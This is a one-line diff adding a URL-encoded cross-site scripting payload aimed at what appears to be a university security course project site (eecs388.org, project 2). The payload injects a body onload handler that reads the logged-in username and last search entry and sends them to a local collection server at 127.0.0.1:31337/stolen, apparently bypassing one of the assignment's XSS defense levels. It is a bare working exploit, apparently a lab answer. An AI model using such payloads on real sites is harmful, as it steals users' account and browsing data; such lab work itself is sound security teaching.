@@ -1,0 +1,1 @@
+http://eecs388.org/project2/search?q=%3Cbody%20onload%3D%24.get(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%3Fuser%3D%22.concat(document.getElementById(%22logged-in-user%22).textContent).concat(%22%2526%22).concat(%22last_search%3D%22).concat(document.getElementById(%22history-list%22).children%5B1%5D.textContent))%3E%26xssdefense%3D1
